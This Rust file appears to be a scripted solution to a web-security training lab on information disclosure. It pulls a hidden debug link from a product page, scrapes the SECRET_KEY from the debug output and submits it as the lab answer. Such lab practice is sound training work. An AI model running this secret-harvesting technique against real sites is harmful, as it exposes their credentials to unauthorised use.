/****************************************************************
*
* Author: Ahmed Elqalawy (@elqal3awii)
*
* Date: 2/9/2023
*
* Lab: Information disclosure on debug page
*
* Steps: 1. Check the source code of a product page
*        2. GET the href of the commented a tag named "Debug"
*        3. Extract the secret key
*        4. submit solution
*
*****************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use std::{collections::HashMap, time::Duration};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0ae700fb032623468425487000c70042.web-security-academy.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    println!(
        "{} {}",
        "1. Checking the source code..".white(),
        "OK".green()
    );

    // check the source code of a product page
    let product_req = client.get(format!("{url}/product?productId=4")).send();

    // if response is OK
    if let Ok(res) = product_req {
        // get the body of the response
        let body = res.text().unwrap();

        // extract the debug path; change this if it is changed in your case
        let debug_path = capture_pattern("href=(.*)>Debug", &body);

        // if the href is found
        if let Some(text) = debug_path {
            println!(
                "{} {} => {}",
                "2. Extracting the debug path..".white(),
                "OK".green(),
                text.yellow()
            );

            // fetch the debug page
            let debug_page = client.get(format!("{url}{text}")).send();

            // if fetching is OK
            if let Ok(res) = debug_page {
                println!(
                    "{} {}",
                    "3. Fetching the debug page..".white(),
                    "OK".green()
                );

                // get the body of the debug page
                let body = res.text().unwrap();

                // extract the secret key
                let secret_pattern = capture_pattern("SECRET_KEY.*class=\"v\">(.*) <", &body);

                // if the key is found
                if let Some(text) = secret_pattern {
                    println!(
                        "{} {} => {}",
                        "4. Extracting the secret key..".white(),
                        "OK".green(),
                        text.yellow()
                    );

                    // submit solution
                    let submit_answer = client
                        .post(format!("{url}/submitSolution"))
                        .form(&HashMap::from([("answer", text)]))
                        .send();

                    // if sumbitting is successful
                    if let Ok(res) = submit_answer {
                        println!("{} {}", "5. Submitting solution..".white(), "OK".green());
                        println!(
                            "{} {}",
                            "🗹 Check your browser, it should be marked now as"
                                .white()
                                .bold(),
                            "solved".green().bold()
                        )
                    } else {
                        println!("{}", "[!] Failed to submit solution".red())
                    }
                } else {
                    println!("{}", "[!] No secret key was found".red())
                }
            }
        } else {
            println!("{}", "[!] No debug path names was found".red())
        }
    }
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/********************************************
* Function to capture a pattern form a text
*********************************************/
fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap().captures(text);
    if pattern.is_some() {
        Some(pattern.unwrap().get(1).unwrap().as_str().to_string())
    } else {
        None
    }
}
